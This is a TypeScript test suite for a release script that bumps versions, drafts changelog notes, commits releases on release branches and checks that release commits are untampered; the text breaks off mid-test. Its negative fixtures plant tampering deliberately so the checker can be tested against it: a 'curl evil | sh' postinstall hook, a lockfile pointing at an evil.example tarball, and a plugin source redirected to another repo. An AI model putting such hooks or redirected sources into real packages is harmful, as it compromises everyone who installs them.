// scripts/release.ts: the version bump, the notes draft, the release commit on release/v<version>, and how a
// resume finds the release in flight, its PR and its release commit.
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { execFileSync } from 'node:child_process';
import { repoTemplate, tempRepo } from '../../helpers.ts';
import {
  behindDevelop,
  compareVersions,
  draftSection,
  dropNotes,
  inFlight,
  insertedSection,
  insertSection,
  landOnDevelop,
  lastTag,
  MARKETPLACE,
  nextVersion,
  parseArgs,
  pickReleasePr,
  prepare,
  releaseBranches,
  releaseCommitOf,
  releaseState,
  rewriteVersion,
  runProblems,
  setVersion,
  subjectsSince,
  versionsAt,
  versionsLine,
  type Run,
} from '../../../scripts/release.ts';
import { Refusal } from '../../../scripts/main-update.ts';

const ROOT = path.resolve(import.meta.dirname, '..', '..', '..');
const POSIX = { skip: process.platform === 'win32' && 'POSIX-only' };
const tmpDir = (prefix: string) => fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), prefix)));
const out = (repo: { git: (...a: string[]) => Buffer }, ...args: string[]) => repo.git(...args).toString().trim();

const CONSTANTS = [
  'export const CONFIG_SCHEMA_VERSION = 22;',
  'export const JOB_SCHEMA_VERSION = 14;',
  'export const EVENT_SCHEMA_VERSION = 2;',
  'export const ARCHIVE_SCHEMA_VERSION = 1;',
  'export const API_VERSION = 29;',
  'export const SEVERITIES = 4;',
].join('\n');
const LITERALS = { CONFIG_SCHEMA_VERSION: 22, JOB_SCHEMA_VERSION: 14, EVENT_SCHEMA_VERSION: 2, ARCHIVE_SCHEMA_VERSION: 1, API_VERSION: 29 };

const TWO = ["export const X = [", "  // a step's comment", "  { id: 'one', up: (c) => c },", "  { id: 'two', up: (c) => {", '    return c;', '  } },', '];'].join('\n');
const THREE = ['export const API_CHANGES = [', "  { id: 'api-2' },", "  { id: 'api-3' },", "  { id: 'api-4' },", '] as const;'].join('\n');
const LISTS_SCHEMA = ['export const ARCHIVE_SCHEMA_VERSION = 1;', "export { CONFIG_SCHEMA_VERSION } from '../versions/config.ts';"].join('\n');

/** The four files a bump rewrites, at `version`, with marketplace.json's forge ref at `ref`. */
function versionTexts(version: string, ref: string): Record<string, string> {
  return {
    'package.json': `{\n  "name": "forge",\n  "version": "${version}",\n  "files": ["bin", "lib"],\n  "engines": { "node": ">=22.18" }\n}\n`,
    'package-lock.json': `{\n  "name": "forge",\n  "version": "${version}",\n  "lockfileVersion": 3,\n  "packages": {\n    "": {\n      "name": "forge",\n      "version": "${version}"\n    },\n    "node_modules/x": {\n      "version": "${version}"\n    }\n  }\n}\n`,
    '.claude-plugin/plugin.json': `{\n  "name": "forge",\n  "version": "${version}"\n}\n`,
    '.claude-plugin/marketplace.json': `{\n  "name": "forge",\n  "plugins": [\n    {\n      "name": "forge",\n      "source": { "source": "url", "url": "https://github.com/o/forge.git", "ref": "${ref}" },\n      "category": "development"\n    }\n  ]\n}\n`,
  };
}
function writeFiles(dir: string, files: Record<string, string>): void {
  for (const [rel, text] of Object.entries(files)) {
    fs.mkdirSync(path.dirname(path.join(dir, rel)), { recursive: true });
    fs.writeFileSync(path.join(dir, rel), text);
  }
}
const readFiles = (dir: string, rels: string[]) => Object.fromEntries(rels.map((r) => [r, fs.readFileSync(path.join(dir, r), 'utf8')]));

test('nextVersion bumps by name or takes a greater X.Y.Z', () => {
  const rows: [string, string][] = [
    ['patch', '0.18.8'],
    ['minor', '0.19.0'],
    ['major', '1.0.0'],
    ['0.18.10', '0.18.10'],
    ['1.0.0', '1.0.0'],
  ];
  for (const [want, got] of rows) assert.equal(nextVersion('0.18.7', want), got, want);
  for (const bad of ['0.18.7', '0.18.6', '0.9.9', '1.0', '1.0.0-rc.1', 'next', '']) assert.throws(() => nextVersion('0.18.7', bad), Refusal, bad);
  assert.throws(() => nextVersion('0.18', 'patch'), Refusal);
  // Numeric, not string, order: 1.10.0 is after 1.9.0.
  assert.ok(compareVersions('1.10.0', '1.9.0') > 0);
  assert.ok(compareVersions('1.2.3', '1.2.3') === 0);
  assert.ok(compareVersions('0.20.0', '1.0.0') < 0);
});

test('setVersion rewrites only the version lines and the marketplace ref', () => {
  const dir = tmpDir('forge-release-bump-');
  try {
    const rels = Object.keys(versionTexts('0.18.7', 'main'));
    for (const ref of ['main', 'v0.18.7']) {
      writeFiles(dir, versionTexts('0.18.7', ref));
      setVersion(dir, '0.18.7', '0.19.0');
      const want = versionTexts('0.19.0', 'v0.19.0');
      // The lockfile's dependency at the same version is not a version line of the package.
      want['package-lock.json'] = want['package-lock.json'].replace('"node_modules/x": {\n      "version": "0.19.0"', '"node_modules/x": {\n      "version": "0.18.7"');
      assert.deepEqual(readFiles(dir, rels), want, `from ref ${ref}`);
    }

    // The same rewrite, on one file's text: what releaseCommitOf replays on a parent's bytes.
    const texts = versionTexts('0.18.7', 'main');
    assert.equal(rewriteVersion('package.json', texts['package.json'], '0.18.7', '0.19.0'), versionTexts('0.19.0', 'main')['package.json']);
    assert.equal(rewriteVersion(MARKETPLACE, texts['.claude-plugin/marketplace.json'], '0.18.7', '0.19.0'), versionTexts('0.18.7', 'v0.19.0')['.claude-plugin/marketplace.json']);
    assert.throws(() => rewriteVersion('README.md', '{}', '0.18.7', '0.19.0'), Refusal, 'a file no bump touches');

    // A refusal writes nothing: no forge plugin, no source.ref, or a version a file does not hold.
    const before = versionTexts('0.18.7', 'main');
    const rows: [string, Record<string, string>, string, RegExp][] = [
      ['no forge plugin', { '.claude-plugin/marketplace.json': before['.claude-plugin/marketplace.json'].replace('"name": "forge",\n      "source"', '"name": "other",\n      "source"') }, '0.18.7', /\.claude-plugin\/marketplace\.json/],
      ['no source.ref', { '.claude-plugin/marketplace.json': before['.claude-plugin/marketplace.json'].replace(', "ref": "main"', '') }, '0.18.7', /\.claude-plugin\/marketplace\.json/],
      ['a from no file holds', {}, '0.18.6', /package\.json/],
    ];
    for (const [what, edits, from, error] of rows) {
      const files = { ...before, ...edits };
      writeFiles(dir, files);
      assert.throws(() => setVersion(dir, from, '0.19.0'), (e: unknown) => e instanceof Refusal && error.test(e.message), what);
      assert.deepEqual(readFiles(dir, rels), files, `${what}: nothing written`);
    }

    // The real version files bump cleanly by one patch.
    const real = tmpDir('forge-release-real-');
    try {
      for (const rel of rels) {
        fs.mkdirSync(path.dirname(path.join(real, rel)), { recursive: true });
        fs.copyFileSync(path.join(ROOT, rel), path.join(real, rel));
      }
      const current = JSON.parse(fs.readFileSync(path.join(ROOT, 'package.json'), 'utf8')).version;
      const next = nextVersion(current, 'patch');
      setVersion(real, current, next);
      const json = (rel: string) => JSON.parse(fs.readFileSync(path.join(real, rel), 'utf8'));
      assert.equal(json('package.json').version, next);
      assert.equal(json('package-lock.json').version, next);
      assert.equal(json('package-lock.json').packages[''].version, next);
      assert.equal(json('.claude-plugin/plugin.json').version, next);
      assert.equal(json('.claude-plugin/marketplace.json').plugins.find((p: any) => p.name === 'forge').source.ref, `v${next}`);
    } finally {
      fs.rmSync(real, { recursive: true, force: true });
    }
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test('versionsAt reads literal constants and version lists', () => {
  const rows: [string, Record<string, string>, Record<string, number>][] = [
    ['a tag with literal constants in lib/core/job/schema.ts', { 'lib/core/job/schema.ts': CONSTANTS }, LITERALS],
    ['a tag from before the lib/ layers, with only lib/schema.ts', { 'lib/schema.ts': CONSTANTS }, LITERALS],
    [
      'a tree with version lists, one entry multi-line',
      {
        'lib/core/job/schema.ts': LISTS_SCHEMA,
        'lib/core/versions/config.ts': TWO,
        'lib/core/versions/job.ts': THREE,
        'lib/core/versions/event.ts': TWO,
        'lib/api/versions.ts': THREE,
      },
      { ARCHIVE_SCHEMA_VERSION: 1, CONFIG_SCHEMA_VERSION: 3, JOB_SCHEMA_VERSION: 4, EVENT_SCHEMA_VERSION: 3, API_VERSION: 4 },
    ],
    ['a tree with no schema file', {}, {}],
  ];
  for (const [name, files, want] of rows) assert.deepEqual(versionsAt((rel) => files[rel] ?? null), want, name);
});

test('the notes draft lists the commits since the previous tag and the versions that moved', POSIX, () => {
  const repo = tempRepo();
  try {
    const commit = (subject: string) => repo.git('commit', '-q', '--allow-empty', '-m', subject);
    repo.git('tag', 'v0.9.0');
    repo.git('checkout', '-qb', 'develop');
    commit('feat: a');
    commit('fix: b');
    commit('Release 1.0.0');
    // The release PR's merge on main is what v1.0.0 tags; the release commit is in its ancestry.
    repo.git('checkout', '-q', 'main');
    repo.git('merge', '-q', '--no-ff', '-m', 'Merge pull request #1 from o/release/v1.0.0', 'develop');
    repo.git('tag', '-a', 'v1.0.0', '-m', 'Forge 1.0.0');
    repo.git('tag', 'v1.0.0-rc.1');
    commit('fix: only on main');
    repo.git('checkout', '-q', 'develop');
    commit('feat: c');
    commit('feat: d');

    assert.equal(lastTag(repo.dir), 'v1.0.0');
    assert.deepEqual(subjectsSince(repo.dir, 'v1.0.0'), ['feat: d', 'feat: c']);
    assert.deepEqual(subjectsSince(repo.dir, null), ['feat: d', 'feat: c', 'Release 1.0.0', 'fix: b', 'feat: a', 'init']);
  } finally {
    repo.cleanup();
  }

  assert.equal(
    versionsLine({ CONFIG_SCHEMA_VERSION: 22, JOB_SCHEMA_VERSION: 16, API_VERSION: 29 }, { CONFIG_SCHEMA_VERSION: 26, JOB_SCHEMA_VERSION: 16, API_VERSION: 31 }),
    '- Versions: config schema 22 → 26, `API_VERSION` 29 → 31.',
  );
  assert.equal(versionsLine(LITERALS, LITERALS), null);

  const line = '- Versions: job schema 14 → 15.';
  const draft = draftSection('0.19.0', 'v0.18.7', ['Add \u001b[31mred\u001b[0m (#1)', 'Release 0.18.7 (#2)', 'Fix x (#3)', 'Release 0.18.6'], line).split('\n');
  assert.equal(draft[0], '## 0.19.0');
  assert.match(draft[2], /^<!-- Drafted from the commits since v0\.18\.7\./);
  assert.deepEqual(draft.slice(3), ['- Add  [31mred [0m (#1)', '- Fix x (#3)', line]);
  assert.deepEqual(draftSection('0.19.0', null, [], null).split('\n').slice(3), ['- ']);
  assert.equal(dropNotes(draft.join('\n')), ['## 0.19.0', '', '- Add  [31mred [0m (#1)', '- Fix x (#3)', line].join('\n'));

  assert.equal(insertSection('# Changelog\n\n## 0.18.7\n\n- Old.\n', '## 0.19.0\n\n- New.'), '# Changelog\n\n## 0.19.0\n\n- New.\n\n## 0.18.7\n\n- Old.\n');
  assert.equal(insertSection('# Changelog\n', '## 0.1.0\n\n- First.'), '# Changelog\n\n## 0.1.0\n\n- First.\n');

  // insertedSection reads back what insertSection put in, and nothing else.
  const log = '# Changelog\n\n## 0.18.7\n\n- Old.\n';
  assert.equal(insertedSection(log, insertSection(log, '## 0.19.0\n\n- New.')), '## 0.19.0\n\n- New.');
  assert.equal(insertedSection('# Changelog\n', insertSection('# Changelog\n', '## 0.1.0\n\n- First.')), '## 0.1.0\n\n- First.');
  const notInserted: [string, string][] = [
    ['unchanged', log],
    ['an older section edited', insertSection(log, '## 0.19.0').replace('- Old.', '- Older.')],
    ['something above the heading', `x${insertSection(log, '## 0.19.0')}`],
    ['something after the old section', `${insertSection(log, '## 0.19.0')}- More.\n`],
    ['empty', ''],
  ];
  for (const [what, text] of notInserted) assert.equal(insertedSection(log, text), null, what);
});

test('runProblems trusts only a successful push run of the named workflow on the exact commit', () => {
  const sha = 'b'.repeat(40);
  const want = { repo: 'o/forge', workflow: 'main-update.yml', sha, branch: 'release/v1.2.3' };
  const good: Run = {
    id: 1,
    path: '.github/workflows/main-update.yml',
    event: 'push',
    status: 'completed',
    conclusion: 'success',
    head_sha: sha,
    head_branch: 'release/v1.2.3',
    html_url: 'https://github.com/o/forge/actions/runs/1',
    repository: { full_name: 'o/forge' },
    head_repository: { full_name: 'o/forge' },
  };
  assert.deepEqual(runProblems(good, want), []);
  assert.deepEqual(runProblems({ ...good, status: 'in_progress', conclusion: null }, want), [], 'still running');
  assert.deepEqual(runProblems({ ...good, event: 'workflow_dispatch' }, want), [], 'a manual run');
  const rows: [string, Partial<Run>, RegExp][] = [
    ['another workflow', { path: '.github/workflows/ci.yml' }, /not main-update\.yml/],
    ['another sha', { head_sha: 'a'.repeat(40) }, new RegExp(`not ${sha}`)],
    ['another branch', { head_branch: 'develop' }, /not release\/v1\.2\.3/],
    ['a pull_request run', { event: 'pull_request' }, /pull_request event/],
    ['a fork head', { head_repository: { full_name: 'fork/forge' } }, /not o\/forge's own/],
    ['no repository', { repository: undefined }, /not o\/forge's own/],
    ['failed', { conclusion: 'failure' }, /ended failure/],
    ['cancelled', { conclusion: 'cancelled' }, /ended cancelled/],
  ];
  for (const [what, change, problem] of rows) assert.match(runProblems({ ...good, ...change }, want).join('\n'), problem, what);
});

test('parseArgs takes one version, a notes file only with it, and --yes', () => {
  assert.deepEqual(parseArgs([]), { want: null, notesFile: null, yes: false });
  assert.deepEqual(parseArgs(['minor', '--yes']), { want: 'minor', notesFile: null, yes: true });
  assert.deepEqual(parseArgs(['0.19.0', '--notes-file', 'n.md']), { want: '0.19.0', notesFile: 'n.md', yes: false });
  for (const bad of [['--notes-file', 'n.md'], ['minor', 'patch'], ['next'], ['minor', '--notes-file'], ['--force'], ['-y']]) assert.equal(parseArgs(bad), null, JSON.stringify(bad));
});

/** develop one commit past a tagged 1.0.0 release, with the version files, marketplace ref and CHANGELOG. */
const developRepo = repoTemplate((dir) => {
  const git = (...args: string[]) => execFileSync('git', args, { cwd: dir, stdio: 'pipe' });
  writeFiles(dir, { ...versionTexts('1.0.0', 'v1.0.0'), 'CHANGELOG.md': '# Changelog\n\n## 1.0.0\n\n- First.\n' });
  git('add', '-A');
  git('commit', '-qm', 'Release 1.0.0');
  git('tag', '-a', 'v1.0.0', '-m', 'Forge 1.0.0');
  git('checkout', '-qb', 'develop');
  fs.writeFileSync(path.join(dir, 'README.md'), '# develop\n');
  git('commit', '-qam', 'feat: develop work');
});

test('prepare commits the release on release/v<version> and leaves develop alone', POSIX, () => {
  const notesDir = tmpDir('forge-release-notes-');
  const repos: { cleanup: () => void }[] = [];
  try {
    const notes = path.join(notesDir, 'notes.md');
    fs.writeFileSync(notes, '## 1.1.0\n\n- New things.\n');
    const repo = developRepo();
    repos.push(repo);
    const develop = out(repo, 'rev-parse', 'develop');
    const sha = prepare(repo.dir, '1.0.0', '1.1.0', notes);

    assert.equal(out(repo, 'rev-parse', 'refs/heads/release/v1.1.0'), sha);
    assert.equal(out(repo, 'rev-list', '--parents', '-n', '1', sha), `${sha} ${develop}`, 'its only parent is develop');
    assert.equal(releaseCommitOf(repo.dir, sha, '1.1.0', 'develop'), sha, 'what prepare makes is what a resume accepts');
    assert.equal(out(repo, 'log', '-1', '--format=%B', sha), 'Release 1.1.0');
    const at = (rel: string) => out(repo, 'show', `${sha}:${rel}`);
    assert.equal(JSON.parse(at('package.json')).version, '1.1.0');
    assert.equal(JSON.parse(at('package-lock.json')).packages[''].version, '1.1.0');
    assert.equal(JSON.parse(at('.claude-plugin/plugin.json')).version, '1.1.0');
    assert.equal(JSON.parse(at('.claude-plugin/marketplace.json')).plugins[0].source.ref, 'v1.1.0');
    assert.equal(at('CHANGELOG.md'), '# Changelog\n\n## 1.1.0\n\n- New things.\n\n## 1.0.0\n\n- First.');
    assert.deepEqual(out(repo, 'diff', '--name-only', develop, sha).split('\n').sort(), ['.claude-plugin/marketplace.json', '.claude-plugin/plugin.json', 'CHANGELOG.md', 'package-lock.json', 'package.json']);

    assert.equal(out(repo, 'symbolic-ref', '--short', 'HEAD'), 'develop');
    assert.equal(out(repo, 'rev-parse', 'develop'), develop);
    assert.equal(out(repo, 'status', '--porcelain', '--untracked-files=all'), '');

    // A section with no notes refuses after the bump: everything is put back.
    const bad = developRepo();
    repos.push(bad);
    fs.writeFileSync(notes, '## 9.9.9\n\n- Notes for another version.\n');
    assert.throws(() => prepare(bad.dir, '1.0.0', '1.1.0', notes), (e: unknown) => e instanceof Refusal && /"## 1\.1\.0" has no notes/.test(e.message));
    assert.equal(execFileSync('git', ['branch', '--list', 'release/*'], { cwd: bad.dir }).toString(), '', 'no release branch');
    assert.equal(out(bad, 'rev-parse', 'develop'), develop, 'no commit');
    assert.equal(out(bad, 'symbolic-ref', '--short', 'HEAD'), 'develop');
    assert.equal(out(bad, 'status', '--porcelain', '--untracked-files=all'), '', 'a clean tree');

    // A release branch that already exists is never replaced.
    bad.git('branch', 'release/v1.1.0', 'v1.0.0');
    fs.writeFileSync(notes, '## 1.1.0\n\n- New things.\n');
    assert.throws(() => prepare(bad.dir, '1.0.0', '1.1.0', notes), /release\/v1\.1\.0 already exists/);
    assert.equal(out(bad, 'rev-parse', 'release/v1.1.0'), out(bad, 'rev-parse', 'v1.0.0^{commit}'));
    assert.equal(out(bad, 'status', '--porcelain', '--untracked-files=all'), '');
  } finally {
    for (const r of repos) r.cleanup();
    fs.rmSync(notesDir, { recursive: true, force: true });
  }
});

test('a release in flight is found from release/v* branches and main\'s version', () => {
  const [A, B] = ['a'.repeat(40), 'b'.repeat(40)];
  const refs = [
    `${A} refs/heads/release/v1.3.0`,
    `${B} refs/remotes/origin/release/v1.3.0`,
    `${A} refs/heads/release/v1.2`,
    `${A} refs/heads/release/v1.2.3-rc.1`,
    `${A} refs/heads/release/x`,
    `${A} refs/remotes/origin/release/v1.2.0`,
    `${A} refs/heads/release/v1.1.9`,
    `${A} refs/remotes/upstream/release/v9.0.0`,
    `${A.slice(1)} refs/heads/release/v2.0.0`,
    '',
  ].join('\n');
  assert.deepEqual(releaseBranches(refs, '1.2.0'), [
    { version: '1.3.0', sha: A, remote: false },
    { version: '1.3.0', sha: B, remote: true },
  ]);
  assert.deepEqual(releaseBranches(`${A} refs/heads/release/v1.10.0`, '1.9.0'), [{ version: '1.10.0', sha: A, remote: false }], 'numeric order');

  const branch = (version: string) => ({ version, sha: A, remote: true });
  const rows: [string, string, ReturnType<typeof branch>[], unknown][] = [
    ['a branch ahead', '1.2.0', [branch('1.3.0')], { version: '1.3.0', from: 'branch' }],
    ['only main ahead', '1.3.0', [], { version: '1.3.0', from: 'main' }],
    ['main and the branch at one version', '1.3.0', [branch('1.3.0')], { version: '1.3.0', from: 'branch' }],
    ['nothing ahead', '1.2.0', [], null],
    ['a branch at develop\'s version', '1.2.0', [branch('1.2.0')], null],
  ];
  for (const [what, main, branches, want] of rows) assert.deepEqual(inFlight('1.2.0', main, branches), want, what);
  const refused: [string, string, ReturnType<typeof branch>[], RegExp][] = [
    ['main and a branch at two versions', '1.3.0', [branch('1.4.0')], /1\.3\.0, 1\.4\.0/],
    ['two branches', '1.2.0', [branch('1.3.0'), branch('1.2.1')], /1\.2\.1, 1\.3\.0/],
  ];
  for (const [what, main, branches, listed] of refused) {
    assert.throws(() => inFlight('1.2.0', main, branches), (e: unknown) => e instanceof Refusal && listed.test(e.message), what);
  }
});

test('pickReleasePr takes only this repo\'s release/v<version> PR into main', () => {
  const [H, M] = ['c'.repeat(40), 'd'.repeat(40)];
  const row = (o: Record<string, unknown> = {}) => ({
    number: 7,
    state: 'OPEN',
    url: 'https://github.com/o/forge/pull/7',
    headRefName: 'release/v1.2.3',
    headRefOid: H,
    baseRefName: 'main',
    isCrossRepository: false,
    mergeCommit: null,
    ...o,
  });
  const want = { version: '1.2.3' };
  const open = { number: 7, url: 'https://github.com/o/forge/pull/7', state: 'open', head: H, merge: null };
  const rows: [string, unknown[], unknown][] = [
    ['an open PR', [row()], open],
    ['a merged PR', [row({ state: 'MERGED', mergeCommit: { oid: M } })], { ...open, state: 'merged', merge: M }],
    ['a closed PR', [row({ state: 'CLOSED' })], { ...open, state: 'closed' }],
    ['a fork with the same branch name', [row({ isCrossRepository: true })], null],
    ['a fork beside ours, malformed', [row({ isCrossRepository: true, number: 'x', headRefOid: 'x' }), row()], open],
    ['another base', [row({ baseRefName: 'develop' })], null],
    ['another head', [row({ headRefName: 'release/v1.2.4' })], null],
    ['none', [], null],
    ['an open PR beside a closed one', [row({ state: 'CLOSED', number: 5 }), row()], open],
    ['the newest of two closed', [row({ state: 'CLOSED', number: 5 }), row({ state: 'CLOSED', number: 6 })], { ...open, number: 6, state: 'closed' }],
  ];
  for (const [what, prs, got] of rows) assert.deepEqual(pickReleasePr(prs, want), got, what);
  const refused: [string, unknown][] = [
    ['two open', [row(), row({ number: 8 })]],
    ['open and merged', [row(), row({ number: 8, state: 'MERGED', mergeCommit: { oid: M } })]],
    ['a fractional number', [row({ number: 7.5 })]],
    ['a string number', [row({ number: '7' })]],
    ['a short head', [row({ headRefOid: 'abc1234' })]],
    ['a malformed merge sha', [row({ state: 'MERGED', mergeCommit: { oid: 'x' } })]],
    ['a merged PR with no merge commit', [row({ state: 'MERGED' })]],
    ['not a list', { number: 7 }],
  ];
  for (const [what, prs] of refused) assert.throws(() => pickReleasePr(prs, want), Refusal, what);
});

test('releaseCommitOf accepts only a release commit npm run release made, or its main update', POSIX, () => {
  const repo = tempRepo();
  try {
    const sha = () => out(repo, 'rev-parse', 'HEAD');
    const dist = () => {
      fs.mkdirSync(path.join(repo.dir, 'dashboard', 'dist'), { recursive: true });
      fs.writeFileSync(path.join(repo.dir, 'dashboard', 'dist', 'index.html'), '<!doctype html>\n');
      repo.git('add', '--force', 'dashboard/dist');
    };
    writeFiles(repo.dir, { ...versionTexts('1.0.0', 'v1.0.0'), 'CHANGELOG.md': '# Changelog\n\n## 1.0.0\n\n- First.\n' });
    repo.git('add', '-A');
    repo.git('commit', '-qm', 'Release 1.0.0');
    repo.git('checkout', '-qb', 'develop');
    repo.git('commit', '-q', '--allow-empty', '-m', 'feat: work');
    const work = sha();
    // A branch merged into develop with a merge commit: its commit is an ancestor of develop but never develop's tip.
    repo.git('checkout', '-qb', 'side');
    repo.git('commit', '-q', '--allow-empty', '-m', 'feat: side');
    const side = sha();
    repo.git('checkout', '-q', 'develop');
    repo.git('merge', '-q', '--no-ff', '-m', 'Merge side', side);
    // The release commit `prepare` makes on `base` (a commit at 1.0.0): the bump and the notes, then `edit` on top of them.
    const releaseOn = (base: string, o: { subject?: string; to?: string; notes?: string; edit?: () => void } = {}) => {
      repo.git('checkout', '-q', '--detach', base);
      setVersion(repo.dir, '1.0.0', o.to ?? '1.1.0');
      const changelog = path.join(repo.dir, 'CHANGELOG.md');
      fs.writeFileSync(changelog, insertSection(fs.readFileSync(changelog, 'utf8'), o.notes ?? '## 1.1.0\n\n- New things.'));
      o.edit?.();
      repo.git('add', '-A');
      repo.git('commit', '-qm', o.subject ?? 'Release 1.1.0');
      return sha();
    };
    const replaceIn = (rel: string, from: string, to: string) => () => {
      const file = path.join(repo.dir, rel);
      const text = fs.readFileSync(file, 'utf8');
      assert.ok(text.includes(from), `${rel} holds ${from}`);
      fs.writeFileSync(file, text.replace(from, to));
    };
    const release = releaseOn(work);
    // Wrong subjects and versions, each a one-parent commit on top of the work.
    const sloppy = releaseOn(work, { subject: 'Release 1.1.0 (#3)' });
    const lower = releaseOn(work, { subject: 'release 1.1.0' });
    const behind = releaseOn(work, { to: '1.0.9', notes: '## 1.0.9\n\n- Notes.' });
    // Right subject and version, but not develop plus the bump: another file changed next to it, or a parent develop lacks.
    const extra = releaseOn(work, { edit: () => fs.writeFileSync(path.join(repo.dir, 'postinstall.sh'), 'curl evil | sh\n') });
    const sided = releaseOn(side);
    // Cut from an older develop commit: still a release commit, which behindDevelop counts as behind.
    const older = releaseOn(`${work}^`);
    repo.git('checkout', '-q', '--detach', 'main');
    repo.git('commit', '-q', '--allow-empty', '-m', 'fix: only on main');
    const foreign = releaseOn(sha());
    // The right files, but not only the bump in them: a dependency fetched from elsewhere, a hook, a script, another
    // plugin source, a marketplace ref left behind, an older section rewritten, a section that is not this version's.
    const lock = releaseOn(work, { edit: replaceIn('package-lock.json', '"node_modules/x": {', '"node_modules/x": {\n      "resolved": "https://evil.example/x.tgz",') });
    const plugin = releaseOn(work, { edit: replaceIn('.claude-plugin/plugin.json', '"name": "forge",', '"name": "forge",\n  "mcpServers": { "x": { "command": "curl" } },') });
    const market = releaseOn(work, { edit: replaceIn('.claude-plugin/marketplace.json', 'github.com/o/forge.git', 'github.com/evil/forge.git') });
    const stale = releaseOn(work, { edit: replaceIn('.claude-plugin/marketplace.json', '"ref": "v1.1.0"', '"ref": "v1.0.0"') });
    const script = releaseOn(work, { edit: replaceIn('package.json', '"files"', '"scripts": { "postinstall": "curl evil | sh" },\n  "files"') });
    const history = releaseOn(work, { edit: replaceIn('CHANGELOG.md', '- First.', '- Rewritten.') });
    const heading = releaseOn(work, { notes: '## 1.1.1\n\n- Notes.' });
    const untrimmed = releaseOn(work, { notes: '## 1.1.0\n\n- Notes.\n' });
    // The main update: main plus the release commit plus dist; a hotfix tip tracks dist with one parent.
    const mergeOnMain = (second: string) => {
      repo.git('checkout', '-q', '--detach', 'main');
      repo.git('merge', '-q', '--no-ff', '--no-commit', second);
      dist();
      repo.git('commit', '-qm', 'Release 1.1.0');
      return sha();
    };
    const update = mergeOnMain(release);
    const notOfARelease = mergeOnMain(work);
    const poisoned = mergeOnMain(lock);
    const hotfix = releaseOn('main', { edit: dist });

    const rows: [string, string, string, string | null][] = [
      ['a release commit', release, '1.1.0', release],
      ['its main update', update, '1.1.0', release],
      ['a release commit for another version', release, '1.2.0', null],
      ['a hotfix tip tracking dashboard/dist', hotfix, '1.1.0', null],
      ['a subject with a PR number', sloppy, '1.1.0', null],
      ['a lowercase subject', lower, '1.1.0', null],
      ['package.json at another version', behind, '1.1.0', null],
      ['a merge whose second parent is not a release commit', notOfARelease, '1.1.0', null],
      ['a main update asked for another version', update, '1.0.0', null],
      ['not a sha', 'HEAD', '1.1.0', null],
      ['a release commit that changes another file', extra, '1.1.0', null],
      ['a release commit whose parent develop lacks', foreign, '1.1.0', null],
      ['a release commit on a branch merged into develop', sided, '1.1.0', null],
      ['a release commit cut from an older develop', older, '1.1.0', older],
      ['a lockfile whose resolved URL changed', lock, '1.1.0', null],
      ['a main update over that lockfile', poisoned, '1.1.0', null],
      ['a plugin.json that gained a key', plugin, '1.1.0', null],
      ['a marketplace.json that names another repo', market, '1.1.0', null],
      ['a marketplace ref left at the old tag', stale, '1.1.0', null],
      ['a package.json that gained a script', script, '1.1.0', null],
      ['a CHANGELOG that rewrote an older section', history, '1.1.0', null],
      ['a CHANGELOG section for another version', heading, '1.1.0', null],
      ['a CHANGELOG section with a trailing blank line', untrimmed, '1.1.0', null],
    ];
    // `develop` is the ref a release commit's parent must be on (origin/develop for a resume).
    for (const [what, tip, v, want] of rows) assert.equal(releaseCommitOf(repo.dir, tip, v, 'develop'), want, what);
    assert.equal(releaseCommitOf(repo.dir, release, '1.1.0', 'refs/remotes/origin/develop'), null, 'no origin/develop to be on');
    // What develop has that the release lacks: the side branch and its merge, plus `work` for the older cut.
    assert.equal(behindDevelop(repo.dir, release, 'develop'), 2);
    assert.equal(behindDevelop(repo.dir, older, 'develop'), 3);
    repo.git('update-ref', 'refs/remotes/origin/develop', release);
    assert.equal(releaseCommitOf(repo.dir, release, '1.1.0'), release, 'origin/develop is the default');
    assert.equal(releaseCommitOf(repo.dir, update, '1.1.0'), release, 'a main update of it, by the default');
    assert.equal(releaseCommitOf(repo.dir, foreign, '1.1.0'), null, 'a parent origin/develop lacks, by the default');
    assert.equal(behindDevelop(repo.dir, release), 0, 'origin/develop is the default');
  } finally {
    repo.cleanup();
  }
});

test('a landing whose push was declined is still in flight, and the next run pushes it as it is', POSIX, () => {
  const notesDir = tmpDir('forge-release-notes-');
  const repo = developRepo();
  try {
    const notes = path.join(notesDir, 'notes.md');
    fs.writeFileSync(notes, '## 1.1.0\n\n- New things.\n');
    const D = out(repo, 'rev-parse', 'develop');
    const R = prepare(repo.dir, '1.0.0', '1.1.0', notes);
    // The release PR merged: origin/main holds its merge, origin/develop is where it was, the branch is still on origin.
    repo.git('checkout', '-q', '--detach', 'main');
    repo.git('merge', '-q', '--no-ff', '-m', 'Merge pull request #9 from o/release/v1.1.0', R);
    const M = out(repo, 'rev-parse', 'HEAD');
    repo.git('checkout', '-q', 'develop');
    repo.git('update-ref', 'refs/remotes/origin/develop', D);
    repo.git('update-ref', 'refs/remotes/origin/main', M);
    repo.git('update-ref', 'refs/remotes/origin/release/v1.1.0', R);
    const inFlightAfterMerge = { developVersion: '1.0.0', mainVersion: '1.1.0', flight: { version: '1.1.0', from: 'branch' } };
    assert.deepEqual(releaseState(repo.dir), inFlightAfterMerge);

    // The run lands the release on local develop, and the maintainer declines the push.
    assert.equal(landOnDevelop(repo.dir, R, '1.1.0'), R, 'origin/develop is still its parent: a fast-forward');
    assert.equal(out(repo, 'rev-parse', 'develop'), R);
    assert.equal(JSON.parse(fs.readFileSync(path.join(repo.dir, 'package.json'), 'utf8')).version, '1.1.0', 'the working tree reads the release now');
    assert.deepEqual(releaseState(repo.dir), inFlightAfterMerge, 'the remotes decide, not the working tree');

    // The repo deletes the branch on merge: it is found from main's version, and the landing is pushed as it is.
    repo.git('update-ref', '-d', 'refs/remotes/origin/release/v1.1.0');
    repo.git('branch', '-D', 'release/v1.1.0');
    assert.deepEqual(releaseState(repo.dir), { ...inFlightAfterMerge, flight: { version: '1.1.0', from: 'main' } });
    assert.equal(landOnDevelop(repo.dir, R, '1.1.0'), R);
    assert.equal(out(repo, 'rev-parse', 'develop'), R, 'nothing new was committed');

    // Once origin/develop has it, nothing is in flight and there is nothing to push.
    repo.git('update-ref', 'refs/remotes/origin/develop', R);
    assert.equal(landOnDevelop(repo.dir, R, '1.1.0'), null);
    assert.equal(releaseState(repo.dir).flight, null);

    // origin/develop moved on while the release was in flight: a Release merge on a develop that equals it.
    const moveDevelop = (from: string, file: string, text: string) => {
      repo.git('reset', '-q', '--hard', from);
      fs.writeFileSync(path.join(repo.dir, file), text);
